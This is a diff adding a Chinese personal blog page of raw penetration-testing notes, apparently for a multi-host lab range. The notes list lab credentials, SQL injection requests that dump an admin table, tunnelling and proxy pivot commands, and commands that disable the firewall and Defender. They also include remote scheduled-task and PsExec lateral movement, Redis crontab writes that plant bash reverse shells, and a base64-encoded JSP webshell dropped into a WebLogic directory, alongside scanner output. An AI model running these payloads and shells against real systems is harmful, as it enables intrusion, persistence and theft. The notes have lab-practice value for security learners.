@@ -1,0 +1,404 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>cfs | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2023/11/17/cfs/cfs/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-3Z9EQ7RWNS')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'cfs',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/others/xingkong.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">cfs</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">cfs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-17T08:39:43.000Z" title="发表于 2023-11-17 16:39:43">2023-11-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-27T08:06:42.266Z" title="更新于 2023-11-27 16:06:42">2023-11-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3,447</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>root密码：teamssix.com</p>
+<p>此主机的IP地址：<br>192.168.1.11<br>192.168.22.11</p>
+<p>宝塔后台登陆地址及密码：<br>地址：<a target="_blank" rel="noopener" href="http://192.168.1.11:8888/a768f109/">http://192.168.1.11:8888/a768f109/</a><br>账号：eaj3yhsl<br>密码：41bb8fee</p>
+<p>root密码：teamssix.com</p>
+<p>此主机的IP地址：<br>192.168.22.22<br>192.168.33.22</p>
+<p>宝塔后台登陆地址及密码：<br>地址：<a target="_blank" rel="noopener" href="http://192.168.22.22:8888/2cc52ec0/">http://192.168.22.22:8888/2cc52ec0/</a><br>账号：xdynr37d<br>密码：123qwe..</p>
+<p>GET /index.php?r=vul&amp;keyword=1’ union%20select%20database(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39–%20123<br><a target="_blank" rel="noopener" href="http://192.168.22.129/index.php?r=vul&amp;keyword=1&#39;">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#39;</a> union select databases(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39– 123<br>GET /index.php?r=vul&amp;keyword=1’ union select database(),1,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39  from information_schema.tables where table_schema=’bagecms’–%2012<br>bage_ad,bage_admin,bage_admin_group,bage_admin_logger,bage_attr,bage_attr_val,bage_catalog,bage_config,bage_link,bage_page,bage_post,bage_post_2tags,bage_post_album,bage_post_comment,bage_post_tags,bage_question,bage_special,bage_upload</p>
+<p>id,username,password,realname,group_id,email,qq,notebook,mobile,telephone,last_login_ip,last_login_time,login_count,status_is,create_time<br>GET /index.php?r=vul&amp;keyword=1’ union select database(),1,1,id,username,password,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 from bagecms.bage_admin–%20123 HTTP/1.1<br>Array<br>(<br>    [0] =&gt; Post Object<br>        (<br>            [_new:CActiveRecord:private] =&gt;<br>            [_attributes:CActiveRecord:private] =&gt; Array<br>                (<br>                    [id] =&gt; bagecms<br>                    [user_id] =&gt; 1<br>                    [nickname] =&gt; 1<br>                    [author] =&gt; 1<br>                    [title] =&gt; admin<br>                    [title_second] =&gt; 46f94c8de14fb36680850768ff1b7f2a<br>123qwe</p>
+<p>./ew -s lcx_tran -l 17777 -f 192.168.22.129 -g 17775 -t 1000000<br>./ew -s ssocksd -l 17775 -t 1000000</p>
+<p>中间机器<br>./ew -s lcx_slave -d 192.168.144.142 -e 37779 -f 192.168.33.33 -g 39999 -t 100000</p>
+<p>左边机器<br>./ew -s lcx_listen -l 37777 -e 37779 -t 100000</p>
+<p>右边机器<br>.\ew_for_Win.exe -s ssocksd -l 39999 -t 100000</p>
+<p>setg Proxies socks5:ip2:8321 设置全局代理<br>set ReverseAllowProxy true 这个参数是因为使用全局代理，可能会导致我们的shell无法反弹，所以需要开启。<br>ip2:8321</p>
+<p>中间zuo机器<br>./ew -s lcx_slave -d 192.168.144.142 -e 37779 -f 192.168.33.33 -g 39998 -t 100000</p>
+<p>中间you机器<br>.\ew_for_Win.exe -s lcx_slave -d 192.168.22.129 -e 39998 -f 192.168.44.130 -g 39989 -t 100000<br>.\ew_for_Win.exe -s lcx_slave -d 192.168.33.128 -e 39998 -f 192.168.44.130 -g 39989 -t 100000<br>左边机器<br>./ew -s lcx_listen -l 37777 -e 37779 -t 100000</p>
+<p>右边机器<br>.\ew_for_Win.exe -s ssocksd -l 39989 -t 100000</p>
+<p>proxychains nmap -Pn -sT -T4 -F 192.168.88.100</p>
+<p>8A..;123admin</p>
+<p>dynamic_chain ：动态模式,按照代理列表顺序自动选取可用代理<br>strict_chain ：严格模式,严格按照代理列表顺序使用代理，所有代理必须可用<br>round_robin_chain ：轮询模式，自动跳过不可用代理<br>random_chain ：随机模式,随机使用代理</p>
+<p>administrator/admin@123</p>
+<p>vulntarget\win2008<br>qweASD123</p>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>
+<p>netsh advfirewall set allprofiles state off</p>
+<p>set-MpPreference -DisableRealtimeMonitoring $true</p>
+<p>dir \WIN-1PV25H8UJPN.vulntarget.com dir<br>schtasks /create /s WIN-1PV25H8UJPN.vulntarget.com /tn test /sc minute /mo 1 /tr “C:\Windows\System32\cmd.exe /c ‘whoami &gt; C:\Users\Administrator\result.txt’” /ru system /f<br>dir \WIN-1PV25H8UJPN.vulntarget.com\C$<br>C:\Users\Administrator\Desktop\PSTools&gt;PsExec.exe -accepteula \WIN-1PV25H8UJPN cmd.exe</p>
+<p>set xxoo “\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.100.21/10001 0&gt;&amp;1\n\n”</p>
+<p>proxychains echo -e “\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.100.21/1234 0&gt;&amp;1\n\n”|redis-cli -h 172.17.20.250 -a 123456 -x set 1<br>proxychains redis-cli -h 172.17.20.250 -a 123456 config set dir /var/spool/cron/<br>proxychains redis-cli -h 172.17.20.250 -a 123456 config set dbfilename redis<br>proxychains redis-cli -h 172.17.20.250 -a 123456 save</p>
+<p>nc -l -p 1234 -vv</p>
+<p>/ /<em>\_</em><strong><em>_</em> \ (</strong>| | | (<em>| | (<strong>|   &lt;<br>_</strong></em>/     |<em><strong>/_</strong>|</em>|  _<em>,</em>|__<em>|</em>|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target ‘172.17.20.1’ is alive<br>(icmp) Target ‘172.17.20.10’ is alive<br>(icmp) Target ‘172.17.20.110’ is alive<br>(icmp) Target ‘172.17.20.250’ is alive<br>(icmp) Target ‘172.17.20.113’ is alive<br>icmp alive hosts len is: 5<br>172.17.20.110:7001 open</p>
+<p>172.17.20.250:6379 open<br>172.17.20.250:3306 open</p>
+<p>172.17.20.113:445 open<br>172.17.20.113:139 open</p>
+<p>172.17.20.250:22 open<br>172.17.20.113:135 open<br>172.17.20.113:80 open</p>
+<p>172.17.20.10:80 open</p>
+<p>172.17.20.10:22 open<br>172.17.20.10:443 open<br>172.17.20.1:3000 open<br>alive ports len is: 12<br>start vulscan<br>[+] Redis:172.17.20.250:6379 123456<br>[+] Redis:172.17.20.250:6379 like can write /var/spool/cron/<br>NetInfo:<br>[<em>]172.17.20.113<br>   [-&gt;]WIN-MS7AC966K31<br>   [-&gt;]172.17.20.113<br>[</em>] WebTitle:<a target="_blank" rel="noopener" href="http://172.17.20.113/">http://172.17.20.113</a>      code:200 len:39     title:Office Anywhere 2017版 网络智能办公系统<br>[<em>] 172.17.20.113        WORKGROUP\WIN-MS7AC966K31   Windows Server 2012 R2 Standard 9600<br>[+] InfoScan:<a target="_blank" rel="noopener" href="http://172.17.20.113/">http://172.17.20.113</a>      [通达OA]<br>[</em>] WebTitle:<a target="_blank" rel="noopener" href="http://172.17.20.10/">http://172.17.20.10</a>       code:200 len:7      title:Meetsec<br>[*] WebTitle:<a target="_blank" rel="noopener" href="https://172.17.20.10/">https://172.17.20.10</a>      code:200 len:7      title:Meetsec</p>
+<p>/home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war</p>
+<p>bash -i &gt;&amp; /dev/tcp/172.16.100.21/10002 0&gt;&amp;1</p>
+<p>echo PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IFN0cmluZyBwYXNzPSJwYXNzIjsgU3RyaW5nIG1kNT1tZDUocGFzcyt4Yyk7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTttLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge31yZXR1cm4gcmV0OyB9IHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtTdHJpbmcgdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldEVuY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXSB7IGJ5dGVbXS5jbGFzcyB9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt0cnkgeyBiYXNlNjQ9Q2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW10geyBTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSU+PCV0cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9IAolPg==</p>
+<p>echo PCUhIFN0 |base64 -d &gt; /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp<br>cat /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</p>
+<p><a target="_blank" rel="noopener" href="http://172.16.100.21:7001/bea_wls_internal/a.jsp">http://172.16.100.21:7001/bea_wls_internal/a.jsp</a></p>
+<p>echo ‘a’ &gt; /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</p>
+<p>mysql -h 172.17.20.250 -u typecho -p</p>
+<p>bash -i &gt;&amp; /dev/tcp/172.16.100.21/2333 0&gt;&amp;1</p>
+<p> This is the sshd server system-wide configuration file.  See<br> sshd_config(5) for more information.</p>
+<p> This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</p>
+<p> The strategy used for options in the default sshd_config shipped with<br> OpenSSH is to specify options with their default value where<br> possible, but leave them commented.  Uncommented options override the<br> default value.</p>
+<p>Include /etc/ssh/sshd_config.d/*.conf</p>
+<p>Port 22<br>AddressFamily any<br>ListenAddress 0.0.0.0<br>ListenAddress ::</p>
+<p>HostKey /etc/ssh/ssh_host_rsa_key<br>HostKey /etc/ssh/ssh_host_ecdsa_key<br>HostKey /etc/ssh/ssh_host_ed25519_key</p>
+<p> Ciphers and keying<br>RekeyLimit default none</p>
+<p> Logging<br>SyslogFacility AUTH<br>LogLevel INFO</p>
+<p> Authentication:</p>
+<p>LoginGraceTime 2m<br>PermitRootLogin prohibit-password<br>StrictModes yes<br>MaxAuthTries 6<br>MaxSessions 10</p>
+<p>PubkeyAuthentication yes</p>
+<p> Expect .ssh/authorized_keys2 to be disregarded by default in future.<br>AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</p>
+<p>AuthorizedPrincipalsFile none</p>
+<p>AuthorizedKeysCommand none<br>AuthorizedKeysCommandUser nobody</p>
+<p> For this to work you will also need host keys in /etc/ssh/ssh_known_hosts<br>HostbasedAuthentication no<br> Change to yes if you don&apos;t trust ~/.ssh/known_hosts for<br> HostbasedAuthentication<br>IgnoreUserKnownHosts no<br> Don&apos;t read the user&apos;s ~/.rhosts and ~/.shosts files<br>IgnoreRhosts yes</p>
+<p> To disable tunneled clear text passwords, change to no here!<br>PasswordAuthentication yes<br>PermitEmptyPasswords no</p>
+<p> Change to yes to enable challenge-response passwords (beware issues with<br> some PAM modules and threads)<br>KbdInteractiveAuthentication no</p>
+<p> Kerberos options<br>KerberosAuthentication no<br>KerberosOrLocalPasswd yes<br>KerberosTicketCleanup yes<br>KerberosGetAFSToken no</p>
+<p> GSSAPI options<br>GSSAPIAuthentication no<br>GSSAPICleanupCredentials yes<br>GSSAPIStrictAcceptorCheck yes<br>GSSAPIKeyExchange no</p>
+<p> Set this to &apos;yes&apos; to enable PAM authentication, account processing,<br> and session processing. If this is enabled, PAM authentication will<br> be allowed through the KbdInteractiveAuthentication and<br> PasswordAuthentication.  Depending on your PAM configuration,<br> PAM authentication via KbdInteractiveAuthentication may bypass<br> the setting of &quot;PermitRootLogin without-password&quot;.<br> If you just want the PAM account and session checks to run without<br> PAM authentication, then enable this but set PasswordAuthentication<br> and KbdInteractiveAuthentication to &apos;no&apos;.<br>UsePAM yes</p>
+<p>AllowAgentForwarding yes<br>AllowTcpForwarding yes<br>GatewayPorts no<br>X11Forwarding yes<br>X11DisplayOffset 10<br>X11UseLocalhost yes<br>PermitTTY yes<br>PrintMotd no<br>PrintLastLog yes<br>TCPKeepAlive yes<br>PermitUserEnvironment no<br>Compression delayed<br>ClientAliveInterval 0<br>ClientAliveCountMax 3<br>UseDNS no<br>PidFile /run/sshd.pid<br>MaxStartups 10:30:100<br>PermitTunnel no<br>ChrootDirectory none<br>VersionAddendum none</p>
+<p> no default banner path<br>Banner none</p>
+<p> Allow client to pass locale environment variables<br>AcceptEnv LANG LC_*</p>
+<p> override default of no subsystems<br>Subsystem sftp    /usr/lib/openssh/sftp-server</p>
+<p> Example of overriding settings on a per-user basis<br>Match User anoncvs<br>    X11Forwarding no<br>    AllowTcpForwarding no<br>    PermitTTY no<br>    ForceCommand cvs server<br>PasswordAuthentication yes</p>
+<h2 id="lse-sh"><a href="#lse-sh" class="headerlink" title="$ ./lse.sh"></a>$ ./lse.sh</h2><h2 id="If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges"><a href="#If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges" class="headerlink" title="If you know the current user password, write it here to check sudo privileges:"></a>If you know the current user password, write it here to check sudo privileges:</h2><p> LSE Version: 4.5nw</p>
+<pre><code>    User: acequan
+ User ID: 1000
+Password: none
+    Home: /home/acequan
+    Path: /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/bin:/home/acequan/Oracle/Middleware/                                                                                     Oracle_Home/wlserver/server/bin:/home/acequan/Oracle/Middleware/Oracle_Home/wlserver/../oracle_common/modules/thirdparty/org.a                                                                                     pache.ant/1.10.5.0.0/apache-ant-1.10.5/bin:/usr/lib/jvm/jre/bin:/usr/lib/jvm/bin:/usr/lib/jvm/bin:/usr/local/sbin:/usr/local/b                                                                                     in:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin
+   umask: 0027
+
+Hostname: meetsec-devserver
+   Linux: 5.15.0-43-generic
+</code></pre>
+<p>Distribution: Ubuntu 22.04.1 LTS<br>Architecture: x86_64</p>
+<p>=====================( Current Output Verbosity Level: 0 )======================<br>===============================================================( humanity )=====<br>[!] nowar0 Should we question autocrats and their “military operations”?… yes!</p>
+<hr>
+<pre><code>                                  NO
+                                  WAR
+</code></pre>
+<hr>
+<p>==================================================================( users )=====<br>[i] usr000 Current user groups……………………………………… yes!<br>[<em>] usr010 Is current user in an administrative group?………………… yes!<br>[</em>] usr020 Are there other users in administrative groups?…………….. yes!<br>[<em>] usr030 Other users with shell…………………………………… yes!<br>[i] usr040 Environment information………………………………….. skip<br>[i] usr050 Groups for other users…………………………………… skip<br>[i] usr060 Other users…………………………………………….. skip<br>[</em>] usr070 PATH variables defined inside /etc………………………… yes!<br>[!] usr080 Is ‘.’ in a PATH variable defined inside /etc?……………… nope<br>===================================================================( sudo )=====<br>[!] sud000 Can we sudo without a password?…………………………… nope<br>[!] sud010 Can we list sudo commands without a password?………………. nope<br>[<em>] sud040 Can we read sudoers files?……………………………….. nope<br>[</em>] sud050 Do we know if any other users used sudo?…………………… yes!<br>============================================================( file system )=====<br>[<em>] fst000 Writable files outside user’s home………………………… yes!<br>[</em>] fst010 Binaries with setuid bit…………………………………. 